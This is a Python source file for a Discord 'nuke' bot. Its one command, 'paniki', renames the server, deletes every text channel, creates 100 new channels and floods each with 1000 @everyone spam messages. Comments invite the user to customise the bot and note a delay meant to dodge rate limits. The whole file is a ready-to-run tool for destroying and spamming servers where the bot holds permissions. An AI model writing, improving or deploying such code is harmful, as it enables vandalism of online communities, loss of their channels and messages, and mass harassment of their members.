# Fixed Some Issues

import discord
from discord.ext import commands
import asyncio

# Replace 'your_token_here' with your bot's token 
TOKEN = 'your token'
GUILD_NAME = 'paniki loves you'  # This is the name the server will be renamed to
CHANNEL_NAME = 'paniki loves you'  # This is the name for the channels to create
SPAM_MESSAGE = "wake up @everyone, PANIKI just arrived, and the peace in your favorite server ends now" # This is the message that will be spammed

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True  # Ensure you have this enabled in your bot

bot = commands.Bot(command_prefix='wild', intents=intents) # change the prefix if you want here

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command()
async def paniki(ctx): # change it if you want
    guild = ctx.guild  # Get the guild where the command was invoked

    if guild:
        try:
            # Renaming the server to GUILD_NAME
            await guild.edit(name=GUILD_NAME)
            print(f'Server renamed to: {GUILD_NAME}')
            
            # Delete existing channels, including channels in categories
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    await channel.delete()
                    print(f'Deleted channel: {channel.name}')

            # Create tasks for channel creation and spamming messages
            tasks = []
            for i in range(100):
                channel = await guild.create_text_channel(CHANNEL_NAME)
                print(f'Channel created: {CHANNEL_NAME}')
                
                # Start spamming messages in the newly created channel
                tasks.append(spam_messages(channel))

            # Wait for all tasks to complete
            await asyncio.gather(*tasks)

        except Exception as e:
            print(f'Error during nuke operation: {e}')
            await ctx.send("An error occurred while trying to nuke the server.")

    else:
        await ctx.send("Guild not found. Please check the guild name.")

async def spam_messages(channel):
    """Function to spam messages in a channel."""
    for _ in range(1000):  # Adjust the number of spam messages as needed
        await channel.send(SPAM_MESSAGE)
        print(f'Message sent in {channel.name}')
        await asyncio.sleep(0.01)  # Short delay to avoid rate limits

# Run the bot
bot.run(TOKEN)
